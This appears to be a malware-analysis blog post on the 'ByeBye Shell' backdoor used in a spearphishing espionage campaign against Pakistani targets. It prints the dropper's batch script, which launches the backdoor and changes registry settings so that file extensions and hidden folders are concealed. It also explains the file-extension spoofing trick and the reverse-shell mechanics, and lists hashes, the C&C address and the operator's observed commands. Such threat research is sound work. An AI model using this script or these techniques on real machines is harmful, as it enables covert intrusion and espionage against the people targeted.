Asia and South Asia are a theater for daily attacks and numerous ongoing espionage
campaigns between neighboring countries, so many campaigns that it's hard to keep
count. Recently I stumbled on yet another one, which appears to have been active since at
least the beginning of the year, and seems mostly directed at Pakistani targets.
In this article we're going to analyze the nature of the attacks, the functionality of the
backdoor - here labelled as ByeBye Shell - and the quick interaction I had with the
operators behind this campaign.

Infection
No exploit was used in any of the attacks we attribute to this campaign - the attackers
probably just relied on social engineering the victim through well-crafted spearphishing
emails.
The malware first appears to the victim as a .scr file. In some cases the attackers make use
of the Left-to-Right Override Unicode character in order to twist the .exe file extension
into something more credible.
Once executed it drops and launches a batch script in a %Temp% subfolder with the
following content:
@ echo off
@ start "IEXPLORE.EXE" "<backdoor>"
@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v
Hidden /t REG_DWORD /d 0x00000000 /f
@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v
HideFileExt /t REG_DWORD /d 0x00000001 /f
@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v
ShowSuperHidden /t REG_DWORD /d 0x00000000 /f
@ reg add
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOW
/v CheckedValue /t REG_DWORD /d 0x00000000 /f
@ exit

As you can see, it enforces some configuration in the registry in order to hide file
extensions and not show hidden folders.

Subsequently the malware creates and launches a Cabinet Self-Extractor, which drops
two additional executable files: one embedding either a PDF or a Microsoft Office Word
document, the other being the actual backdoor.
These are the hashes of the original droppers I inspected during this analysis:
8b4224dac114a9b8433913a1977f88b2
469cf94c457c17d8f24dacf9f9d41f33
6b349e439a17c4b66fb2a25965432aa9
d36da5c48d8fb7ee8c736ae183bf3f8a
The embedded documents all show content revolving around internal or foreign
Pakistan politics - following are some examples of such documents:

This document appears to report an article that appeared on Hilal, the magazine of the
Pakistan Armed Forces. You can find a copy of the original article on this Pakistan
institutional website.

Also in this case the attacker seems to have just reused an existing article. Searching
online for the content, it appears to have been originally published on a website called
SATribune, which is no longer online.

This last one coming instead from Reuters.

Backdoor
Let's face it: at the point where the attackers obtain control over the target computer, not
much sophistication is left in day-to-day targeted attacks. PoisonIvy, Gh0st and
custom backdoors are daily business for threat analysts and malware researchers, in most
cases being tedious work with little technical challenge.
This campaign is no exception. The main backdoor installed and executed on the victims'
systems appears to be a custom reverse shell with just a handful of features. Due to a lack
of public literature about this case, I decided to dub this family as ByeByeShell.
When disassembling the binary you can quickly understand the mechanics of the
backdoor. After some quick initialization, the backdoor XORs an embedded string with
0x9D to extract the IP address of the C&C server. Subsequently it establishes a connection
to it (generally on port 80) and checks in with some basic information about the system.

HostName:lab
MAC:
Address 0: 10.0.2.15
[P130813]
As you can see, it reports the computer name, the user name, the IP address and MAC
address of the network adapter. The [P130813] line appears to be a constant value,
possibly a target identifier.
Interestingly, in a specific malware sample belonging to this campaign, the backdoor also
appends the string "INS and AfPak" at the end of the message - note that, as defined by
Wikipedia, "_AfPak (or Af-Pak) is a neologism used within US foreign policy circles to
designate Afghanistan and Pakistan as a single theater of operation_s".
After the check-in message is sent, the malware enters a continuous loop in which it will
keep silently waiting for commands from the open socket connection. From now on, it
expects some manual interaction from the attacker.
The supported commands are:
shell
comd
sleep
quit
kill
You can see the switch block in the following screenshots.

When a message is received from the socket connection, it checks if the message is
"shell" then spawn a reverse shell, otherwise continues by checking for "comd"
which will simply execute a command and returns.

If neither "shell" or "comd" is specified by the operator, it checks if it has been instructed
to sleep or terminate, otherwise it just continues to the next iteration.
In the following screenshot you can see how the reverse shell is implemented: it just
launches a cmd.exe and pipes stdin, stdout and stderr to the opened socket so
that the operator can directly interact with the Windows prompt.

As you can see, this is an extremely basic backdoor, even poorly written if you ask me.
Antivirus detection rate is also reasonably good, despite consisting mostly of generic
signatures.
The samples are also signed with an invalid Microsoft Windows certificate, which can be
used for further fingerprinting:

Playing with the Attacker
In all the cases presented in this blog post, the backdoors tried to connect to the C&C
located at 46.165.207.134, which appears to be a dedicated server hosted by Leaseweb:
inetnum:

46.165.200.0 - 46.165.207.255

At the time of writing, the server appears to still be online. However port 80, which the
backdoors try to contact, appears to be available only sporadically. In order to get some
fun out of an overall straightforward analysis, I quickly hacked together a Python script
that emulates a ByeBye backdoor - following is the code:

As you can see, this script simply tries to emulate the basic functionality of ByeBye: it
performs the initial check-in and waits for incoming messages from the operator.
Yes - since, as previously said, the C&C comes online only at times - I instructed the script
to play an extremely loud alarm. Props to my flatmate for waking me up whenever the
alarm went off.
Surprisingly the operator responded few moments later my first attempt, although he
quickly tried to terminate me probably noticing an unexpected origin:
[ ] Received: kill
[ ] Received: kill
[ ] Received: shell
[ ] Received: shutdown /r /t 0
Unfortunately at that time I didn't have the script completed, therefore he noticed
something odd and closed my connection.
I let a few days pass, completed the script and prepared a more credible scenario: a
legitimate looking system connecting out of South Asia. This time it took a bit longer to
get some response from the operator, who simply tried to search for documents on
the system:
[ ] Received: shell
[ ] Received: systeminfo
[ ] Received: dir /s *.pdf
[ ] Received: dir /s *.doc
[ ] Received: exit
[ ] Received: sleep
Sadly no further activity was observed.

Conclusions
This is yet another case of poorly skilled attackers managing to run successful espionage
campaigns for extended periods of time. This is probably one of the most basic incidents I
encountered so far, but we can safely assume that the operators behind this campaign are
successful enough to maintain the operations running for at least the last 6 months,
possibly even more.
No clear indicator is available to make an informed estimate on what could be the origin
of the attacks.
